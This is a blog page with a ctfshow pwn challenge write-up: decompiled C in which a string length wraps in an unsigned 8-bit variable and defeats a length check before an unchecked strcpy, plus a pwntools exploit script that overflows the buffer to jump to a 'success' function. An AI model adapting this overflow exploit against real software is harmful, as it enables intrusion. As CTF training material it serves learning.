<h2 id="105-unsigned-int8的轮回"><a href="#105-unsigned-int8的轮回" class="headerlink" title="105 unsigned_int8的轮回"></a>105 unsigned_int8的轮回</h2><p>题目;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">8</span>]; <span class="comment">// [esp+7h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Authentication failed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Authentication successful, Hello %s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28155</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shell = elf.sym[<span class="string">&#x27;success&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x11</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(shell)</span><br><span class="line">payload = payload.ljust(<span class="number">256</span>+<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/04/04/csapp/8/8/" rel="prev" title="">
                  <i class="fa fa-angle-left"></i> 
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/04/04/ghctf/hello_world/" rel="next" title="">
                   <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Maple</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
